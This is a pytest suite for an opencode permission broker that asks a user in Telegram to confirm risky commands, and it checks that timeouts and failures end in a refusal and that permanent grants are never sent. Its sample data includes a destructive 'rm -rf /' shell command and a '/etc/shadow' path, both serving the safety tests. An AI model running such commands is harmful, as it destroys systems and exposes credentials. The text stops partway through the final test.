"""Behavioural tests for `core.permissions` -- the opencode permission broker.

This is the most safety-critical module in R2D2. opencode raises a
`permission.asked` event *before* it runs a risky command, the turn is blocked
until somebody answers, and this broker is what answers. Two of its properties
are worth more than the whole feature, so they get their own sections and their
own tests instead of a line in a docstring:

* **A durable grant is unrepresentable.** The server offers a command mask in
  `properties.always` (U4 recorded `["echo *"]`) and ONE such grant survives for
  the rest of the session -- it is not a per-turn answer, it is a rule. So the
  broker holds exactly two answers (`"once"`, `"reject"`), the client's `Literal`
  does not accept a third, and
  `test_the_module_cannot_answer_with_a_durable_grant` reads the source and the
  signature rather than trusting a comment. The mask list is *logged*, so an
  operator can see what a single durable grant would have bought, and it is never
  posted anywhere.
* **Every ambiguous path fails toward `reject`.** A timeout, an unreachable
  server, a 200 that carries `false`, a record whose shape cannot be read: each
  one refuses. The only route to an execution is an explicit "да" inside the
  window, and `test_a_failed_answer_is_never_reported_as_approved` pins that the
  returned verdict reflects what the server was actually told.
* **A turn that needs two confirmations can complete.** D14 measured a second ask
  refusing the first 0.55 s after it was raised, because the row under
  `application_id` held one ask. The row holds a queue now; the invariant is
  "one QUESTION at a time, each ask answered at most once, never `always`", and
  `test_a_second_ask_queues_behind_the_first_and_both_can_be_answered` is it.

**Alice cannot push**, so the confirmation question goes out through Telegram
(`core.tools.telegram_tool.send_message`) and the answer comes back as text from
the same channel. The broker speaks nothing and builds no Alice payload: the
module never reaches for `core.render`, `on_permission_requested` returns `None`,
and that is asserted on the source and on the wire.

The doubles sit at the wire, not at the seam: the real `OpencodeClient` over
`httpx.MockTransport` (so the URL, the `?directory=` and the posted body are all
observed) and `respx` in front of the real `send_message` (so the message the
user would read is observed, and an unmocked Telegram call fails loudly instead
of reaching the network).

Timing: no test sleeps. An expired ask is produced by writing a record whose
`requested_at` is already in the past -- the only clock input the sweep reads --
and the sweep loop's cadence is injected, so the loop test subscribes to the
Telegram delivery instead of waiting out a 30 s interval.
"""

from __future__ import annotations

import ast
import asyncio
import json
import logging
import re
import time
from pathlib import Path
from typing import Final, get_args, get_type_hints

import httpx
import pytest
import respx

from app.config import Config
from core.backends.config_loader import BackendSpec
from core.memory import Memory
from core.opencode.client import OpencodeClient

# ---------------------------------------------------------------------------
# Doubles
# ---------------------------------------------------------------------------

BASE_URL: Final = "http://127.0.0.1:4599"
#: The session and permission ids U4 recorded, verbatim.
SESSION_ID: Final = "ses_f266522f4ffee31XNquJ1D3qjC"
PERMISSION_ID: Final = "per_0d99aed41001iOUiwXDd6vx2NP"
#: The command U4 was asked to confirm, and the mask the server offered for it.
TITLE: Final = "echo R2D2SPIKERUN3K"
MASKS: Final = ("echo *",)
#: A mask that appears NOWHERE else, so "the mask was never sent" is a real
#: assertion instead of a string that would match the command anyway.
EXCLUSIVE_MASK: Final = "MASK-ONLY-FOREVER-9c1f"
#: The credential sentinel, as in the todo 6 and todo 7 suites.
PASSWORD: Final = "R2D2_OC_PASSWORD_VALUE"
#: The configured window a user has to answer in, from `app/config.py`.
TIMEOUT_S: Final = 300.0

APP: Final = "alice-123"
OTHER_APP: Final = "bob-456"
#: The `pending_actions` blob of the OTHER feature that shares the one row per
#: user: the shell confirmation from `core/brain.py`. It deliberately carries the
#: same `session_id`/`permission_id` keys an ask uses, because a `ToolResult.pending`
#: is a free-form dict -- so `kind` is the only thing that can keep this row out of
#: the broker, and this fixture is what proves that it does.
SHELL_PENDING: Final = {
    "tool": "run_shell",
    "arguments": {"command": "rm -rf /"},
    "session_id": SESSION_ID,
    "permission_id": PERMISSION_ID,
}
#: The field set the broker writes, so a shape change is a test failure. `queued` is the
#: tail of the queue (D14): the head's own fields are spread at the top level, so a row
#: holding one ask reads exactly as it always did and only the queue adds a key.
RECORD_FIELDS: Final = {
    "kind",
    "session_id",
    "permission_id",
    "title",
    "always",
    "requested_at",
    "queued",
}

QUESTION: Final = "Нужно подтверждение: {title}. Ответь в телеграм «да» или «нет»."
ACCEPTED: Final = "Принято, выполняю: {title}."
UNANSWERABLE: Final = "Сервер не принял ответ, действие отклонено: {title}."
OVERLOADED: Final = "Запросов подтверждения слишком много, действие отклонено: {title}."
TIMEOUT_NOTICE: Final = "Подтверждение не получено, действие отклонено."


class FakeOpencode:
    """`opencode serve` as a `MockTransport` handler -- the permission route only.

    Four ways that route can answer, and every one of them is a real shape the
    broker has to survive:

    * `200 true` -- the answer landed;
    * `refuses` (`200 false`) -- the server took the call and did not grant it.
      The misleading success: a broker that trusts the status code would report
      an approval the tool never got;
    * `unreachable` (`500`, body echoing the password) -- the call never became
      an answer at all;
    * `forgotten` (`404`) -- the server has never heard of that session, e.g. a
      database restored from an older copy.
    """

    def __init__(self) -> None:
        self.requests: list[httpx.Request] = []
        self.refuses = False
        self.unreachable = False
        self.forgotten: set[str] = set()

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        session_id = self._session_of(request)
        if session_id is None:
            return httpx.Response(404, json={"error": f"no route for {request.method}"})
        if session_id in self.forgotten:
            return httpx.Response(404, json={"error": "session not found"})
        if self.unreachable:
            return httpx.Response(500, json={"error": f"auth failed for {PASSWORD}"})
        return httpx.Response(200, json=not self.refuses)

    def client(self, workspace: str) -> OpencodeClient:
        spec = BackendSpec(
            name="opencode",
            kind="opencode_session",
            base_url=BASE_URL,
            username="r2d2",
            password=PASSWORD,
            timeout=1.0,
        )
        transport = httpx.MockTransport(self)
        return OpencodeClient(spec, workspace, client=httpx.AsyncClient(transport=transport))

    # -- what reached the wire ---------------------------------------------

    def answer_posts(self) -> list[httpx.Request]:
        """Every `POST /session/:id/permissions/:permissionID`, in order."""
        return [
            request
            for request in self.requests
            if request.method == "POST" and "/permissions/" in request.url.path
        ]

    def answers(self) -> list[dict]:
        """Every body posted to that route, in order."""
        return [json.loads(request.content) for request in self.answer_posts()]

    def _session_of(self, request: httpx.Request) -> str | None:
        parts = request.url.path.split("/")
        if request.method != "POST" or parts[1:2] != ["session"] or len(parts) != 5:
            return None
        return parts[2]


class Telegram:
    """The real `send_message`, faked at the transport by respx.

    Observing the message the user would actually read is the point: the broker's
    whole safety story is a question asked in one channel and answered in the
    other. `delivered` is set on every message, so a test that waits for one waits
    for an event instead of polling a counter.
    """

    def __init__(self) -> None:
        # `assert_all_called=False`: several tests must send NOTHING, and that is
        # the property they assert. What still fails loudly is a call respx was not
        # asked about -- an unmocked Telegram request raises instead of escaping to
        # the network.
        self.router = respx.mock(
            assert_all_called=False, base_url="https://api.telegram.org"
        )
        self.route = self.router.post(path="/botTESTTOKEN/sendMessage").mock(side_effect=self._reply)
        self.bodies: list[dict] = []
        self.delivered = asyncio.Event()

    def _reply(self, request: httpx.Request) -> httpx.Response:
        self.bodies.append(json.loads(request.content))
        self.delivered.set()
        return httpx.Response(200, json={"ok": True, "result": {"message_id": len(self.bodies)}})

    def texts(self) -> list[str]:
        return [body["text"] for body in self.bodies]

    def unread(self) -> None:
        self.delivered.clear()


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def db_path(tmp_path) -> str:
    return str(tmp_path / "sessions.db")


@pytest.fixture
async def memory(db_path: str):
    connected = await Memory(db_path).connect()
    try:
        yield connected
    finally:
        await connected.close()


@pytest.fixture
def workspace(tmp_path) -> str:
    path = tmp_path / "r2d2-workspace"
    path.mkdir()
    return str(path)


@pytest.fixture
def cfg(workspace: str) -> Config:
    return Config(
        r2d2_workspace=workspace,
        telegram_bot_token="TESTTOKEN",
        telegram_chat_id="42",
    )


@pytest.fixture
def server() -> FakeOpencode:
    return FakeOpencode()


@pytest.fixture
def telegram() -> Telegram:
    fake = Telegram()
    with fake.router:
        yield fake


@pytest.fixture
def broker(memory: Memory, server: FakeOpencode, cfg: Config, telegram: Telegram):
    from core.permissions import PermissionBroker

    return PermissionBroker(memory, server.client(cfg.r2d2_workspace), cfg)


def make_broker(memory: Memory, server: FakeOpencode, cfg: Config, **kwargs):
    from core.permissions import PermissionBroker

    return PermissionBroker(memory, server.client(cfg.r2d2_workspace), cfg, **kwargs)


async def ask(broker, *, app_id: str = APP, masks: tuple[str, ...] = MASKS) -> None:
    """Raise a permission the way the SSE handler does."""
    await broker.on_permission_requested(app_id, SESSION_ID, PERMISSION_ID, TITLE, masks)


async def age(memory: Memory, app_id: str, *, seconds: float) -> None:
    """Write the pending record back with a clock already in the past.

    The broker reads `requested_at` out of the blob -- the sweep's only clock --
    so this is the same move `tests/test_oc_sessions.py` makes against
    `last_used_at`, and it costs no sleep.
    """
    record = await memory.get_pending(app_id)
    assert record is not None
    await memory.set_pending(app_id, {**record, "requested_at": time.time() - seconds})


def running_tasks() -> set[asyncio.Task]:
    return {task for task in asyncio.all_tasks() if task is not asyncio.current_task()}


# ---------------------------------------------------------------------------
# on_permission_requested -- the ask
# ---------------------------------------------------------------------------


async def test_the_ask_is_stored_field_for_field_and_asked_once_in_telegram(
    broker, memory: Memory, telegram: Telegram
):
    # Given: an agent turn that wants to run something
    before = time.time()
    # When: opencode raises permission.asked
    result = await ask(broker)
    # Then: the record carries every field the broker needs to answer later
    record = await memory.get_pending(APP)
    assert record is not None
    assert set(record) == RECORD_FIELDS
    assert record["kind"] == "opencode_permission"
    assert record["session_id"] == SESSION_ID
    assert record["permission_id"] == PERMISSION_ID
    assert record["title"] == TITLE
    assert record["always"] == list(MASKS)
    assert isinstance(record["requested_at"], float)
    assert before - 1.0 <= record["requested_at"] <= time.time() + 1.0
    # And the user is asked exactly once, in the channel that can push
    assert telegram.texts() == [QUESTION.format(title=TITLE)]
    # And nothing comes back for Alice to say, because there is nothing to say
    assert result is None


async def test_the_ask_sends_exactly_the_agreed_question(broker, telegram: Telegram):
    # Given: an `edit` ask, where opencode puts the paths in `patterns` and no
    # command anywhere
    await broker.on_permission_requested(APP, SESSION_ID, PERMISSION_ID, "/etc/shadow", ("*",))
    # When / Then: the sentence is verbatim and carries nothing but Telegram's fields
    assert telegram.texts() == [QUESTION.format(title="/etc/shadow")]
    assert set(telegram.bodies[0]) == {"chat_id", "text"}
    assert telegram.bodies[0]["chat_id"] == 42


async def test_the_ask_never_builds_an_alice_payload(broker, server: FakeOpencode, telegram: Telegram):
    """Alice's webhook answers with `{response: {text, tts, end_session}}` and has
    no push channel: anything shaped like that from the broker would be a payload
    nobody ever reads, and a sign that the two channels got mixed up."""
    from core import permissions

    # Given: a permission ask
    await ask(broker)
    # When: the source of the whole module is read and parsed
    source = Path(permissions.__file__).read_text(encoding="utf-8")
    imported = {
        alias.name
        for node in ast.walk(ast.parse(source))
        if isinstance(node, (ast.Import, ast.ImportFrom))
        for alias in node.names
    }
    # Then: it never imports or builds an Alice payload
    assert "alice_response" not in source
    assert not any(name.startswith("render") for name in imported)
    assert "core.render" not in imported
    # And the only thing it did was send one Telegram message and touch no route
    assert telegram.texts() == [QUESTION.format(title=TITLE)]
    assert server.requests == []


async def test_a_second_ask_queues_behind_the_first_and_both_can_be_answered(
    broker, memory: Memory, server: FakeOpencode, telegram: Telegram
):
    """**D14, and the reason this file no longer has an eviction test.**

    The live run measured it: a turn that needed two confirmations raised two asks 0.55 s
    apart, and the broker refused the FIRST one 0.15 s after raising it, because the row
    under `application_id` held one ask and the new one evicted it. The user was looking
    at the question for a command that had already been rejected, and the turn could never
    complete. The row was never the constraint -- treating it as a single slot was -- so
    the row now holds a queue and this test is the queue's contract:

    * the first ask stays pending and the second joins behind it;
    * exactly ONE question is on screen at a time, so a `да` in Telegram is never
      ambiguous;
    * each ask is answered at most once, and the answers go out in the order they were
      raised, so the turn's commands run in the order the agent asked for them.
    """
    # Given: one turn that raises two asks, the second a moment after the first
    await broker.on_permission_requested(APP, SESSION_ID, "per_1", "ls -la /tmp", ("ls *",))
    await broker.on_permission_requested(APP, SESSION_ID, "per_2", "curl -s x", ("curl *",))
    # Then: nothing was refused -- the first ask is still answerable
    assert server.answers() == []
    record = await memory.get_pending(APP)
    assert record is not None
    assert record["permission_id"] == "per_1"
    assert [queued["permission_id"] for queued in record["queued"]] == ["per_2"]
    # And the user has ONE question: the one they can actually answer right now
    assert telegram.texts() == [QUESTION.format(title="ls -la /tmp")]
    # When: the first question is answered
    assert await broker.resolve_from_text(APP, "да") == "approved"
    # Then: it landed as `once`, and the SECOND ask is now the question
    assert server.answers() == [{"response": "once"}]
    assert server.answer_posts()[0].url.path.endswith("/permissions/per_1")
    assert telegram.texts()[-1] == QUESTION.format(title="curl -s x")
    assert (await memory.get_pending(APP))["permission_id"] == "per_2"
    # When: the second is answered too -- the turn needing two confirmations completes
    assert await broker.resolve_from_text(APP, "да") == "approved"
    # Then: both were approved once, in order, and nothing is left to answer
    assert [body["response"] for body in server.answers()] == ["once", "once"]
    assert server.answer_posts()[1].url.path.endswith("/permissions/per_2")
    assert await memory.get_pending(APP) is None
    # And a third `да` is an ordinary message again: every ask is answered at most once
    assert await broker.resolve_from_text(APP, "да") == "unrelated"
    assert len(server.answer_posts()) == 2


async def test_a_queue_the_user_cannot_reach_refuses_the_newcomer_and_not_the_head(
    broker, memory: Memory, server: FakeOpencode, telegram: Telegram
):
    """The bound on the queue, and which side of it the refusal falls on.

    `MAX_QUEUED` exists so a turn that raises asks in a loop cannot grow the row without
    end. The ask that does not fit is the one refused, because every ask already stored
    is still reachable by exactly one `да` or `нет`; refusing the head instead -- which is
    what the pre-queue broker did to the older ask -- is the failure D14 was.
    """
    # Given: the queue filled to its bound, one ask at a time
    from core.pending_permission import MAX_QUEUED

    for index in range(MAX_QUEUED + 1):
        await broker.on_permission_requested(APP, SESSION_ID, f"per_{index}", f"cmd {index}", ())
    # Then: the newcomer is refused on the wire, and the head is still the first ask
    assert server.answers() == [{"response": "reject"}]
    assert OVERLOADED.format(title=f"cmd {MAX_QUEUED}") in telegram.texts()
    record = await memory.get_pending(APP)
    assert record is not None
    assert record["permission_id"] == "per_0"
    assert [queued["permission_id"] for queued in record["queued"]] == [
        f"per_{index}" for index in range(1, MAX_QUEUED)
    ]
    # And the refused ask is the ONLY one refused -- the queued ones are still answerable
    assert server.answer_posts()[0].url.path.endswith(f"/permissions/per_{MAX_QUEUED}")
    assert await broker.resolve_from_text(APP, "да") == "approved"
    assert server.answer_posts()[-1].url.path.endswith("/permissions/per_0")


# ---------------------------------------------------------------------------
# resolve_from_text -- the answer
# ---------------------------------------------------------------------------


async def test_yes_posts_once_to_the_exact_url_and_clears_the_record(
    broker, memory: Memory, server: FakeOpencode, telegram: Telegram, workspace: str
):
    # Given: a pending ask
    await ask(broker)
    # When: the user answers in Telegram
    verdict = await broker.resolve_from_text(APP, "да")
    # Then: the server is told to run it ONCE, on exactly that permission
    assert verdict == "approved"
    posts = server.answer_posts()
    assert len(posts) == 1
    assert str(posts[0].url).startswith(
        f"{BASE_URL}/session/{SESSION_ID}/permissions/{PERMISSION_ID}?"
    )
    assert posts[0].url.params["directory"] == workspace
    assert server.answers() == [{"response": "once"}]
    # And the ask is closed, so a second "да" cannot re-open the same permission
    assert await memory.get_pending(APP) is None
    assert await broker.resolve_from_text(APP, "да") == "unrelated"
    assert len(server.answer_posts()) == 1
    # And the user is told it landed
    assert "Принято" in telegram.texts()[-1]


async def test_no_posts_reject_and_clears_the_record(
    broker, memory: Memory, server: FakeOpencode, telegram: Telegram
):
    # Given: a pending ask
    await ask(broker)
    # When: the user refuses
    verdict = await broker.resolve_from_text(APP, "нет")
    # Then: the server is told to refuse it, and the ask is closed
    assert verdict == "rejected"
    assert server.answers() == [{"response": "reject"}]
    assert await memory.get_pending(APP) is None
    assert "Отклонено" in telegram.texts()[-1]


async def test_yes_without_a_pending_ask_is_unrelated_and_sends_nothing(
    broker, server: FakeOpencode, telegram: Telegram
):
    # Given: a user with nothing to confirm
    # When: they say "да" anyway
    verdict = await broker.resolve_from_text(APP, "да")
    # Then: nothing is answered and nothing is sent -- an approval with no ask
    # behind it is how a misheard word becomes code execution
    assert verdict == "unrelated"
    assert server.requests == []
    assert telegram.bodies == []


async def test_an_undecidable_reply_leaves_the_ask_exactly_where_it_was(
    broker, memory: Memory, server: FakeOpencode, telegram: Telegram
):
    # Given: a pending ask
    await ask(broker)
    # When: the user says something that is neither yes nor no
    verdict = await broker.resolve_from_text(APP, "а это вообще что")
    # Then: the ask survives for the real answer, and the server hears nothing
    assert verdict == "unrelated"
    record = await memory.get_pending(APP)
    assert record is not None and record["permission_id"] == PERMISSION_ID
    assert server.requests == []
    # And the only message the user ever got is the question that is still open
    assert telegram.texts() == [QUESTION.format(title=TITLE)]


async def test_a_sentence_containing_an_affirmation_is_not_an_approval(
    broker, memory: Memory, server: FakeOpencode, telegram: Telegram
):
    """The live defect from `qa/live-run.md` §4d, on the broker's own path.

    `confirmation_verdict` used to look for its words as SUBSTRINGS, so `да` inside
    `дай` read as an approval: while a permission was pending, the broker posted a
    one-time approval in answer to a sentence that was not an answer. An approval
    is the one irreversible thing this module does, so the affirmative side is
    matched on whole words only -- and the ask must survive a message that is not
    an answer, so the real `да` after it still works.
    """
    # Given: a pending ask
    await ask(broker)
    # When: the user says something that merely contains `да`
    verdict = await broker.resolve_from_text(APP, "дай сводку")
    # Then: nothing was approved and nothing was refused
    assert verdict == "unrelated"
    assert server.requests == []
    record = await memory.get_pending(APP)
    assert record is not None and record["permission_id"] == PERMISSION_ID
    # And the only message the user ever got is the question that is still open
    assert telegram.texts() == [QUESTION.format(title=TITLE)]
    # And the ask is still answerable: a whole word is still an approval
    assert await broker.resolve_from_text(APP, "да") == "approved"
    assert server.answers() == [{"response": "once"}]


async def test_a_word_that_merely_starts_with_ne_is_not_an_approval(
    broker, memory: Memory, server: FakeOpencode
):
    """The blunt side of the same rule, and what replaced it.

    `DENY_WORDS` holds the bare "не", so the old substring reader denied ANY word
    containing those two letters -- "неопределённое", "некоторый", "невозможно" --
    and, worse, the same bluntness reached the affirmative side: "конечно" and
    "понедельник" were refusals because `не` is inside them. Whole-word reading
    makes such a sentence neither, which leaves the ask pending and lets the
    timeout refuse it -- the safe direction -- and makes the words a user actually
    means approve and refuse again.
    """
    # Given: a pending ask
    await ask(broker)
    # When: the user says something that is not an answer at all
    verdict = await broker.resolve_from_text(APP, "что-то неопределённое")
    # Then: it is neither approved nor refused, and the ask is still answerable
    assert verdict == "unrelated"
    assert server.requests == []
    assert (await memory.get_pending(APP))["permission_id"] == PERMISSION_ID
    # And the word the user means still refuses
    assert await broker.resolve_from_text(APP, "не надо") == "rejected"
    assert server.answers() == [{"response": "reject"}]
    # And the word that only CONTAINED it approves again
    await ask(broker)
    assert await broker.resolve_from_text(APP, "конечно") == "approved"
    assert server.answers() == [{"response": "reject"}, {"response": "once"}]


async def test_a_denial_anywhere_in_the_sentence_beats_an_affirmation(
    broker, memory: Memory, server: FakeOpencode
):
    """`core.policies.confirmation_verdict` checks DENY before AFFIRM, because
    `DENY_WORDS` holds the bare "не": "да, не надо" is a refusal. The broker must
    not "fix" that, so the behaviour is pinned here rather than left to whoever
    reads `policies.py` and disagrees."""
    # Given: a pending ask and a sentence containing both
    await ask(broker)
    # When
    verdict = await broker.resolve_from_text(APP, "да, не надо")
    # Then: it is a refusal
    assert verdict == "rejected"
    assert server.answers() == [{"response": "reject"}]
    assert await memory.get_pending(APP) is None


async def test_a_shell_confirmation_in_the_same_row_is_never_answered(
    broker, memory: Memory, server: FakeOpencode, telegram: Telegram
):
    """`pending_actions` has one row per user, and the shell gate in
    `core/brain.py` writes to it too. Answering somebody else's record would
    answer a permission that does not exist."""
    # Given: a shell confirmation waiting in the shared row
    await memory.set_pending(APP, dict(SHELL_PENDING))
    # When: the user confirms it
    verdict = await broker.resolve_from_text(APP, "да")
    # Then: the broker leaves it alone
    assert verdict == "unrelated"
    assert server.requests == []
    assert telegram.bodies == []
    assert await memory.get_pending(APP) == SHELL_PENDING


async def test_a_record_whose_ids_are_unreadable_is_neither_answered_nor_destroyed(
    broker, memory: Memory, server: FakeOpencode
):
    """The blob is free-form JSON: a row that claims to be a permission but cannot
    name one must not be posted to a URL built out of `None` -- and must not be
    silently dropped either, because something else put it there."""
    # Given: a corrupt record
    await memory.set_pending(APP, {"kind": "opencode_permission", "session_id": 7})
    # When: the user says "да"
    verdict = await broker.resolve_from_text(APP, "да")
    # Then
    assert verdict == "unrelated"
    assert server.requests == []
    assert await memory.get_pending(APP) is not None


async def test_two_answers_arriving_together_post_exactly_once(
    broker, memory: Memory, server: FakeOpencode, telegram: Telegram
):
    """Two turns can land in the same instant -- a voice one and a Telegram one --
    and the second must find the ask already claimed rather than answer it twice."""
    # Given: a pending ask
    await ask(broker)
    # When: both are answered concurrently
    verdicts = await asyncio.gather(
        broker.resolve_from_text(APP, "да"), broker.resolve_from_text(APP, "нет")
    )
    # Then: the record was claimed once -- the first answer took it, and the second
    # found nothing to answer and said so
    assert sorted(verdicts) == ["approved", "unrelated"]
    assert len(server.answer_posts()) == 1
    assert server.answers() == [{"response": "once"}]
    assert await memory.get_pending(APP) is None
    # And the loser told the user nothing, because it did nothing
    assert telegram.texts() == [
        QUESTION.format(title=TITLE),
        ACCEPTED.format(title=TITLE),
    ]


async def test_an_ask_naming_a_session_the_server_never_had_is_still_closed(
    broker, memory: Memory, server: FakeOpencode, telegram: Telegram
):
    """A server that dropped a session (or a database restored from an older copy)
    leaves an ask pointing at nothing. The row goes anyway: a record whose answer
    always 404s is a confirmation the user can never get out of."""
    # Given: a pending ask for a session the server does not have
    server.forgotten.add(SESSION_ID)
    await ask(broker)
    # When: the user answers it
    verdict = await broker.resolve_from_text(APP, "да")
    # Then: the ask is closed, the failure is loud, and nothing wedges
    assert verdict == "rejected"
    assert await memory.get_pending(APP) is None
    assert server.answers() == [{"response": "once"}]
    assert "не принял" in telegram.texts()[-1]


# ---------------------------------------------------------------------------
# The answer must never be a lie
# ---------------------------------------------------------------------------


async def test_a_failed_answer_is_never_reported_as_approved(
    broker, memory: Memory, server: FakeOpencode, telegram: Telegram, caplog
):
    """The misleading success, at its worst: the user said yes, the server never
    heard it, and the tool is still blocked. The verdict must not be an approval,
    the failure must be on record, and no exception may escape into the webhook."""
    # Given: a server that cannot be reached
    server.unreachable = True
    await ask(broker)
    # When: the user says "да"
    with caplog.at_level(logging.WARNING, logger="core.permissions"):
        verdict = await broker.resolve_from_text(APP, "да")
    # Then: the verdict is not an approval, and the failure is on record
    assert verdict == "rejected"
    assert "500" in caplog.text
    # And the user is not left believing the command is running
    assert "не принял" in telegram.texts()[-1]
    # And the record is closed, so a later "да" cannot resurrect a dead ask
    assert await memory.get_pending(APP) is None


async def test_a_server_that_answers_false_is_not_an_approval(
    broker, memory: Memory, server: FakeOpencode, telegram: Telegram
):
    """`200 false` is the call landing and the tool still getting nothing."""
    # Given: a server that takes the call and refuses the answer
    server.refuses = True
    await ask(broker)
    # When
    verdict = await broker.resolve_from_text(APP, "да")
    # Then
    assert verdict == "rejected"
    assert "не принял" in telegram.texts()[-1]
    assert await memory.get_pending(APP) is None


async def test_the_credential_never_reaches_a_message_a_log_or_an_exception(
    broker, server: FakeOpencode, telegram: Telegram, caplog
):
    """The failing server's 500 body echoes the password back, and the client puts
    an excerpt of that body into the exception -- which this module logs."""
    # Given: every path that touches a failure, with a server that leaks
    server.unreachable = True
    await ask(broker)
    # When
    with caplog.at_level(logging.DEBUG):
        verdict = await broker.resolve_from_text(APP, "да")
        swept = await broker.sweep_timeouts()
    # Then: the password is in nothing that leaves this module
    assert verdict == "rejected"
    assert swept == 0
    assert PASSWORD not in caplog.text
    assert all(PASSWORD not in body["text"] for body in telegram.bodies)
    # And this is not vacuous: the failure it describes was logged
    assert "auth failed" in caplog.text


# ---------------------------------------------------------------------------
# sweep_timeouts -- the fail-safe direction
# ---------------------------------------------------------------------------


async def test_the_sweep_refuses_an_expired_ask_and_leaves_a_fresh_one_alone(
    broker, memory: Memory, server: FakeOpencode, telegram: Telegram
):
    # Given: one user who never answered, and one who did not have to
    await ask(broker, app_id=APP)
    await age(memory, APP, seconds=TIMEOUT_S + 1)
    await ask(broker, app_id=OTHER_APP)
    # When: the sweep runs
    swept = await broker.sweep_timeouts()
    # Then: only the expired one is refused, and the user is told why
    assert swept == 1
    assert server.answer_posts()[0].url.path == f"/session/{SESSION_ID}/permissions/{PERMISSION_ID}"
    assert server.answers() == [{"response": "reject"}]
    assert telegram.texts() == [
        QUESTION.format(title=TITLE),
        QUESTION.format(title=TITLE),
        TIMEOUT_NOTICE,
    ]
    assert await memory.get_pending(APP) is None
    survivor = await memory.get_pending(OTHER_APP)
    assert survivor is not None and survivor["permission_id"] == PERMISSION_ID


async def test_an_unanswered_permission_is_refused_never_approved(
    broker, memory: Memory, server: FakeOpencode
):
    """The whole point of the window: when nobody answers, the answer is `reject`.
    The body is asserted exactly, because this is the one POST the module makes on
    its own initiative."""
    # Given: an ask nobody ever answers
    await ask(broker)
    await age(memory, APP, seconds=TIMEOUT_S + 1)
    # When: the window closes
    await broker.sweep_timeouts()
    # Then
    assert server.answers() == [{"response": "reject"}]
    assert await memory.get_pending(APP) is None


async def test_the_sweep_window_is_the_configured_one(
    memory: Memory, server: FakeOpencode, workspace: str, telegram: Telegram
):
    """`r2d2_permission_timeout` is the operator's dial; a sweep that hard-coded
    300 s would ignore it and refuse a confirmation the user was still entitled to
    give."""
    # Given: a broker on a five second window
    impatient = make_broker(
        memory,
        server,
        Config(r2d2_workspace=workspace, r2d2_permission_timeout=5.0),
    )
    await ask(impatient)
    await age(memory, APP, seconds=6.0)
    # When: the sweep runs
    swept = await impatient.sweep_timeouts()
    # Then
    assert swept == 1
    assert server.answers() == [{"response": "reject"}]


async def test_a_record_with_an_unreadable_clock_is_treated_as_expired(
    broker, memory: Memory, server: FakeOpencode
):
    """The blob is free-form JSON, so `requested_at` can be anything. An ask whose
    age cannot be computed must not sit there forever: unknown age is expired."""
    # Given: a record whose clock is not a number
    await ask(broker)
    record = await memory.get_pending(APP)
    await memory.set_pending(APP, {**record, "requested_at": "yesterday"})
    # When
    swept = await broker.sweep_timeouts()
    # Then
    assert swept == 1
    assert server.answers() == [{"response": "reject"}]


async def test_the_sweep_with_nothing_expired_costs_no_request(
    broker, memory: Memory, server: FakeOpencode, telegram: Telegram
):
    # Given: no expired ask, and a shell confirmation that is not this module's
    await memory.set_pending(APP, dict(SHELL_PENDING))
    # When
    swept = await broker.sweep_timeouts()
    # Then: a no-op that touches neither the server nor the user
    assert swept == 0
    assert server.requests == []
    assert telegram.bodies == []
    assert await memory.get_pending(APP) == SHELL_PENDING


async def test_the_sweep_attempts_every_expired_ask_even_when_the_server_refuses(
    broker, memory: Memory, server: FakeOpencode, telegram: Telegram
):
    # Given: two expired asks and a server that takes the calls but grants nothing
    await ask(broker, app_id=APP)
    await ask(broker, app_id=OTHER_APP)
    for app_id in (APP, OTHER_APP):
        await age(memory, app_id, seconds=TIMEOUT_S + 1)
    server.refuses = True
    # When
    swept = await broker.sweep_timeouts()
    # Then: both were attempted and both rows are gone, but the count claims only
    # what the server actually took
    assert swept == 0
    assert server.answers() == [{"response": "reject"}, {"response": "reject"}]
    assert await memory.get_pending(APP) is None
    assert await memory.get_pending(OTHER_APP) is None
    # And both users are told the server did not take the refusal
    assert telegram.texts()[-2:] == [UNANSWERABLE.format(title=TITLE)] * 2


# ---------------------------------------------------------------------------
# start / stop -- the sweep loop
# ---------------------------------------------------------------------------


async def test_the_loop_refuses_an_expired_ask_and_stops_promptly(
    memory: Memory, server: FakeOpencode, cfg: Config, telegram: Telegram
):
    # Given: a broker whose cadence is injected, so no test pays 30 seconds
    looping = make_broker(memory, server, cfg, interval_s=0.01)
    await looping.on_permission_requested(APP, SESSION_ID, PERMISSION_ID, TITLE, MASKS)
    await age(memory, APP, seconds=TIMEOUT_S + 1)
    # The question above already set the event, so clear it: what is waited for below
    # must be the sweep's own message.
    telegram.unread()
    # When: the loop runs on its own initiative
    await looping.start()
    try:
        await asyncio.wait_for(telegram.delivered.wait(), 2.0)
    finally:
        # Then: `stop()` returns without waiting the cadence out
        await asyncio.wait_for(looping.stop(), 2.0)
    assert server.answers() == [{"response": "reject"}]
    assert await memory.get_pending(APP) is None


async def test_a_started_then_stopped_broker_leaves_no_task_behind(broker, telegram: Telegram):
    """A sweep task that outlives `stop()` is destroyed at GC with "Task was
    destroyed but it is pending", and a second `start()` would leave two loops
    racing over one row."""
    # Given: whatever tasks this test already runs with
    idle = running_tasks()
    # When: the broker is started, stopped, and stopped again
    await broker.start()
    await broker.stop()
    await asyncio.wait_for(broker.stop(), 1.0)
    # Then: nothing of it is still running
    assert running_tasks() == idle
    # And starting twice does not leak the first loop
    await broker.start()
    await broker.start()
    await asyncio.wait_for(broker.stop(), 1.0)
    assert running_tasks() == idle


async def test_in_deny_mode_the_broker_says_it_is_inert_and_arms_nothing(
    broker, monkeypatch, caplog
):
    """`EVENT_MODE == "deny"`: `edit`/`external_directory` are refused outright and a
    `bash` ask could not be answered by anyone, so a broker that kept sweeping would
    be answering for a server whose questions have no route back."""
    from core import permissions

    # Given: the deny-mutation mode
    monkeypatch.setattr(permissions, "EVENT_MODE", "deny")
    # When
    with caplog.at_level(logging.INFO, logger="core.permissions"):
        await broker.start()
    # Then: it says so at INFO, and arms no loop
    assert "inert" in caplog.text
    assert "bash" in caplog.text
    assert running_tasks() == set()


async def test_in_poll_mode_the_broker_arms_and_answers_exactly_the_same(
    memory: Memory, server: FakeOpencode, cfg: Config, telegram: Telegram, monkeypatch, caplog
):
    """`EVENT_MODE == "poll"`: asks arrive from the polling collector instead of the
    SSE stream. Only the source changes -- the answer must not."""
    from core import permissions

    # Given: the polling mode
    monkeypatch.setattr(permissions, "EVENT_MODE", "poll")
    polling = make_broker(memory, server, cfg)
    # When
    with caplog.at_level(logging.INFO, logger="core.permissions"):
        await polling.start()
    try:
